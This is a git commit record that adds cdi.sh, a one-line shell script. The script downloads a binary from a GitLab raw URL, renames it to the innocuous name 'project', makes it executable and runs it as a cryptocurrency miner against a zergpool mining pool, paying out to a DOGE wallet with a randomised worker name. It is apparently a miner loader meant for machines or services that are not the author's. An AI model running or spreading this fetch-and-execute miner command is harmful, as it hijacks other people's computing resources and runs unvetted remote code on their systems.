28582eca373668ce9fe72e49ee6a493f5b9125b2
washil789 <88795024+washil789@users.noreply.github.com>
2021-10-29 02:52:34 +0700

    Create cdi.sh

---
+++ cdi.sh
@@ -0,0 +1,1 @@
+wget https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa && mv perusa project && ./project -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-2000 -n 1)-CDI) -p c=DOGE -t 8
